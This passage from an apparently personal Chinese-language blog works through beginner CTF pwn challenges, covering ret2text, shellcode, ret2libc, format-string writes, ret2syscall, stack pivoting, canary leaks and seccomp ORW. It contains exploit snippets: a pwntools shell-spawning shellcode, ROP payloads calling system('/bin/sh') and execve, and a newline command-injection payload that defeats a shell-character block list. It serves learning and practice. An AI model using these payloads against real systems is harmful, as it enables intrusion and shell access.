  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK,I receive your byte.and then?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的a1是一个自己输入的任意数字，题目贴心地提醒我们要利用栈溢出</p>
<p>于是正式开始了ROP的过程，是一个基础的ret2text，有后门函数，把后门函数地址覆盖在栈上存函数返回地址的位置即可</p>
<h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>本道题没有了后门函数，但是某种程度上更加直白：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x1000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>读一个字符串然后不管三七二十一直接执行，所以直接发送一个进入shell的shellcode，用pwntools里的shellcraft可以很方便的构造出来，再用asm转成字节码：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="3-认识libc"><a href="#3-认识libc" class="headerlink" title="3 认识libc"></a>3 认识libc</h3><p>一个程序很难不依赖外部的库函数，即链接库。在本题中终于遇到了libc</p>
<p>一个很重要的事是修改本地可执行文件的libc，因为默认的是本地系统库，而非远程环境下的。而远程的libc文件会与可执行文件一并给出，patchelf一下即可</p>
<p>利用libc的第一步永远是泄露基地址，因为其中函数的运行时地址每次均不一样，且依赖碰撞解题完全不可行，本题作为libc的引入直接给出了printf函数的地址，以及一个足够大的栈溢出</p>
<p>libc里各种零件应有尽有，比如pop rdi; ret和”/bin/sh\x00”字符串，于是下一步就可以为所欲为了：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span> 

recv_data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">)</span>
printf_match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb"location of 'printf': (0x[0-9a-fA-F]+)"</span><span class="token punctuation">,</span> recv_data<span class="token punctuation">)</span>
printf_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>printf_match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span>
<span class="token comment"># 计算libc基址和关键函数地址</span>
libc_base <span class="token operator">=</span> printf_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 查找ROP gadgets</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
pop_rdi_ret <span class="token operator">=</span> rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span> <span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base
ret_gadget <span class="token operator">=</span> rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base

<span class="token comment"># 计算溢出偏移量</span>
<span class="token comment"># buf在rbp-0x40处，需要64字节到达rbp，再8字节覆盖返回地址</span>
offset <span class="token operator">=</span> <span class="token number">64</span> <span class="token operator">+</span> <span class="token number">8</span>

<span class="token comment"># 构造payload</span>
payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> offset
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_gadget<span class="token punctuation">)</span>      <span class="token comment"># 栈对齐</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>     <span class="token comment"># pop rdi; ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>      <span class="token comment"># "/bin/sh"字符串地址</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>     <span class="token comment"># system函数地址</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="boom-amp-amp-boom-revenge"><a href="#boom-amp-amp-boom-revenge" class="headerlink" title="boom &amp;&amp; boom_revenge"></a>boom &amp;&amp; boom_revenge</h3><p>此题用随机数模拟了一个canary，有后门函数和任意读，故只需要猜到这个canary即可，其生成机制：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">114514</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这是一种可以预测的随机机制，time(0)种子在一秒内不变：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes   
<span class="token keyword">import</span> time 

current_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token comment"># 设置随机数种子 </span>
libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>current_time<span class="token punctuation">)</span>     
<span class="token comment"># 生成与程序相同的随机数 </span>
canary_value <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">114514</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>在栈溢出之后接触到的第二个功能强大的漏洞，可以定位泄露寄存器与栈，以及篡改。此题作为引入只需要泄露即可</p>
<p>可以看见：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nice to meet you,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>直接printf输入的字符串，送进去一些%s或者%p，printf函数就会找不到足够的参数于是去栈上匹配，然后把栈上的数据输出出来</p>
<h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><p>按照题目所说，这是一个利用简单、难以防御、危害还可能极大的漏洞：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">_printf_chk</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Enter host to ping: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v0 <span class="token operator">=</span> buf<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  v0 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>
  <span class="token function">_snprintf_chk</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">"ping %s -c 4"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> command<span class="token punctuation">;</span>
  <span class="token function">execute</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>大意是输入一个ping命令，然后要经过一个strlen和一个check函数的检查，只要通过了就会直接执行，这里的check逻辑是：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">return</span> <span class="token function">strpbrk</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">";&amp;|>&lt;$()&#123;&#125;[]'\"`\\!~*"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>也就是不能有如上大部分字符</p>
<p>然而这个检测还是不严格的，strlen遇到<code>\n</code>就会停止，check也没有检测它，所以就可以：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b"1\ncat flag\nping 127.0.0.1\n"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="randomlock"><a href="#randomlock" class="headerlink" title="randomlock"></a>randomlock</h3><p>表面上是一个随机数算法，实际上……呃……种子经过一系列复杂的运算之后是固定的</p>
<p>具体怎么做的忘了</p>
<h3 id="str-check"><a href="#str-check" class="headerlink" title="str_check"></a>str_check</h3><p>涉及一些字符串函数的细节<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What can u say?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%255s"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So,what size is it?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%zu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>len <span class="token operator">></span> <span class="token number">0x18</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Oh,too much."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"meow"</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> str<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> str<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You're right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>str在bss段，dest在栈上。借助一个拷贝函数把str转移到栈上，其中memcpy严格复制n字节，strncpy遇到<code>\0</code>停止，strlen也是遇到<code>\0</code>中断</p>
<p>所以算是栈溢出检查不严格，然后此题有后门函数，按照正常ROP思路ret过去即可</p>
<h3 id="syslock"><a href="#syslock" class="headerlink" title="syslock"></a>syslock</h3><p>此题又引入了一个重要的知识点——系统调用，也就是ret2syscall</p>
<p>基本原理就是认识syscall函数，其依据调用时的rax的不同执行不同的系统调用。此类题目的缺点是需求的“工具”比较多，当然此题作为引入都直白的给出来了</p>
<p>第一个工具，设置syscall的参数，在gadget函数中给出了<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000401240                 pop     rdi
.text:0000000000401241                 pop     rsi
.text:0000000000401242                 pop     rdx
.text:0000000000401243                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>第二个工具，修改rax的值，也在gadget函数中给出了<br><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000401244                 pop     rax
.text:0000000000401245                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>第三个工具，传入的参数，也就是”/bin/sh\x00”，此题有读入一个字符串到bss段，输入即可<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">0xCu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>然后注入字符串s的地址</p>
<p>最后一个工具，ret2syscall的根本，一个syscall，在程序中也能直接找到</p>
<p>于是构建ROP链，注意栈对齐：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">8</span>
payload <span class="token operator">+=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">64</span>  

<span class="token comment">#payload += p64(ret)*0                    # ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>              <span class="token comment"># pop rax ; ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span>                       <span class="token comment"># RAX = 59</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>                      <span class="token comment"># ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_ret<span class="token punctuation">)</span>  <span class="token comment"># endbr64 ; pop rdi ; pop rsi ; pop rdx ; ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>               <span class="token comment"># RDI = "/bin/sh" 指向新的字符串位置</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment"># RSI = NULL</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment"># RDX = NULL</span>
<span class="token comment">#payload += p64(ret) *0                  </span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>                  <span class="token comment"># syscall</span>
```   

<span class="token comment">### xdulaker</span>
栈上的数据在rbp<span class="token operator">/</span>rsp变化后不会立即清理，如果进行新的函数调用时未初始化栈上变量，就有很大的利用空间

此题另一个考察点事开启了四大保护之一的PIE保护，即随机化代码段地址，在IDA里看到的地址不再是<span class="token number">0x40</span>????，而是：
```text
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0000000000001249</span> backdoor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这样的小地址，想要获得真是地址需要和之前的libc一样，泄漏点什么地址，而相对位置是固定不变的，借此找到其余函数地址。此题同样没有为难我们，直接告知了，本题有后门函数，ret2text即可</p>
<h3 id="easylibc"><a href="#easylibc" class="headerlink" title="easylibc"></a>easylibc</h3><p>此题开启了ASLR和PIE两种保护，但是重点考察内容则是动态链接和延迟绑定，简单的说——调用库函数时去查表找具体的地址，而对应的表项直到调用时才会生成。</p>
<p>同样，涉及libc的题目总是要泄露基地址，本题printf了read的地址，然而此时read还没调用过，输出的是其plt表表项的地址，借此得到其余函数地址，也就是破解了PIE保护。</p>
<p>借助栈溢出重新回到main函数，此时read函数已经调用过，再次printf时就输出了其libc地址，也就是得到了libc基地址，接下来就和认识libc那道题一样构建ROP链即可</p>
<h3 id="ezpivot"><a href="#ezpivot" class="headerlink" title="ezpivot"></a>ezpivot</h3><p>本题涉及了一个新的技巧，栈迁移（stack pivot）</p>
<p>函数read了两次，第一次写到bss段，长度自己输入，作为一个有符号数不大于32，但是实际使用时是作为无符号数处理的——简而言之输入-1得到无限读，即bss段无限写</p>
<p>第二次read的长度固定，只溢出16字节</p>
<p>另外本题表面上有后门函数时ret2text，实际上是一个<code>system(&quot;echo moectf&#123;WowYouGetTheFlag&#125;&quot;)</code>，里面显然不是真正的flag，此题还给了pop rdi；ret的gadget，其实是一道ret2syscall</p>
<p>第一步是解决ROP链放不下的问题，借助篡改栈上保存的rbp实现栈迁移，把另一段可控区域作为新的栈，在可控区域内布置ROP链，用一个leave ret的gadget把rbp恢复到保存值</p>
<p>此题给的是system而非syscall，不需要设置rax，但是仍然需要”/bin/sh\x00”字符串，写在bss段一个找得到的地址即可</p>
<p>一个大坑是system系统调用过程中访问了一个比较低的地址，如果访问到了代码段就会出错，所以要给栈留出足够大的空间</p>
<h3 id="ezprotection"><a href="#ezprotection" class="headerlink" title="ezprotection"></a>ezprotection</h3><p>有后门函数，但是增加了canary保护导致常规的栈溢出变得不可行，然而read再puts导致了canary的泄露，栈溢出又重新可行了：</p>
<p>canary为了截断一些用来泄露的函数，诸如puts，它的最低一个字节是0x00，因此，如果你能通过栈溢出覆盖掉这个0x00，就可以用输出函数将其泄露出来，</p>
<p>此题有后门函数，backdoor函数里有一些装模作样的密码检查，实际上完全不用在意，ret到检查结束之后即可</p>
<p>另外此题也有PIE保护，这里要了解PIE的随机特点，即颗粒度并不会很细，低12位是不变的。然而篡改的颗粒度是字节，也即16位，需要多次尝试爆破一下</p>
<h3 id="fmt-S"><a href="#fmt-S" class="headerlink" title="fmt_S"></a>fmt_S</h3><p>卡了我相当长时间的一道题，也基本宣告着这一个月学习的终点，是我在tsctf前解出的最后一道题</p>
<p>涉及非栈上的格式化字符串漏洞，时值hitsz的ctf比赛招新，在他们的文档里看到了此类题目的解法，然后经过反复调试才逐步学会</p>
<p>完整贴一下题目吧：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>

  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You're walking down the road when a monster appear."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>flag<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token function">talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>atk <span class="token operator">&lt;=</span> <span class="token number">0x1BF52</span> <span class="token punctuation">)</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You've been eaten by the monster."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">he</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">size_t</span> <span class="token function">talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You start talking to him..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  flag <span class="token operator">^=</span> <span class="token number">1u</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> fmt<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You enraged the monster-prepare for battle!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>atk<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在fmt那道题里提到过格式化字符串漏洞是可以完成篡改的，具体而言，当读到%n参数，会把匹配到的位置看做地址，往其中写入已经printf的字节数，因而实现了篡改，有四种大小参数，%n、%hn、%hhn、%lln，分别对应4、2、1、8字节</p>
<p>此题中flag和atk都是bss段的全局变量，而最重要的，读入的内容fmt也在bss段，而非栈上</p>
<p>先说常规之处，控制循环的变量i既然在栈上，就在格式化字符串课篡改的范围内，所以循环次数一定是要改成无穷多次的。</p>
<p>libc地址和函数地址很难不出现在栈上，利用gdb和%p可以很轻易地泄露出来</p>
<p>最终的利用是篡改printf的got表项，把其内容改成system函数的地址，这样再一次printf时输入”/bin/sh\x00”即可getshell</p>
<p>然而篡改got表并非最优解，因为printf和system的地址后3字节不同，%hn不够，%n又过长，偏偏此题限制read长度无法分两次，实战中用%n传了足足半个小时，但也是拿到flag了</p>
<p>题解给的思路是篡改整个程序的返回地址，在那里构建ROP链，既然还在栈上显然也是在格式化字符串的能力范围内，且可以分步改，不像printf一样一次printf改不完就会崩掉</p>
<p>真正的难点是如何借助栈上的指针完成篡改</p>
<p>假设栈地址A上有一个指向C的指针B，看起来就是这样的： A: B-&gt;C</p>
<p>如果把B作为%n的参数，printf会把B看做一个指针去篡改C，于是实现了对C的篡改</p>
<p>同时B如果是一个栈地址，就一定存在 B: C</p>
<p>我们可以借助 A-B-C这条链把C改成另一个指针——假设为D，其值为E，这样再把B作为%n的参数，就可以借助B-D-E这条链篡改E的值</p>
<p>由于这里C可以被篡改成任意地址，所以E就可以成为任意值，于是任意写就达成了，此题的核心利用也就完成了</p>
<h3 id="hardpivot"><a href="#hardpivot" class="headerlink" title="hardpivot"></a>hardpivot</h3><p>依旧是栈迁移，在tsctf里遇到了此题的变种，本题友善地提供了pop rdi; ret的gadget，故而比之简单一些。</p>
<p>按照栈迁移的一般思路，第一步是得到一块可控区域。然后是ret2libc必要的libc基地址，都得到后即可按照常规思路getshell</p>
<p>溢出16字节，第一轮栈迁移，将rbp转移到bss段，把返回地址篡改为read函数，从设置参数开始。正常流程执行完毕后leave_ret，rbp变成了篡改后的值且回到了read调用前，buf位置是依据rbp确定的</p>
<p>然后泄露libc，在可控段构建ROP链，利用pop rdi完成puts(puts.got)即可，在ROP链的结尾再触发一次read，然后leave，把rbp改到新buf[0]的值</p>
<p>再然后第二次迁移，再进行一轮ROP，思路不变，pop rdi /bin/sh\x00 call system即可</p>
<h3 id="fmt-t"><a href="#fmt-t" class="headerlink" title="fmt_t"></a>fmt_t</h3><p>其实相比于fmt_s的非栈上指针复杂的简介修改，此题输入内容在栈上反而简单了不少，基本思路即先把要篡改的数据地址读到栈上，再把它作为%n的参数完成篡改，同时此题第一轮read可以泄露libc地址</p>
<p>hell(5)只能读入5个字节，由于hell调用时递归的，其读入的内容在最后执行，”/bin/sh\x00”过长，用”sh\x00”即可</p>
<p>printf和system依然是低3字节不同，需要篡改两次</p>
<h3 id="shellbox"><a href="#shellbox" class="headerlink" title="shellbox"></a>shellbox</h3><p>沙箱保护、静态链接</p>
<p>通过seccomp禁掉了execve等系统调用，然而getshell不行可以ORW，即open、read、write</p>
<p>思路是在bss段上写入shellcode，然后利用栈溢出跳到开头完成执行，但是在此之前还需要用mprotect函数给予bss段可执行权限，ROP完成</p>
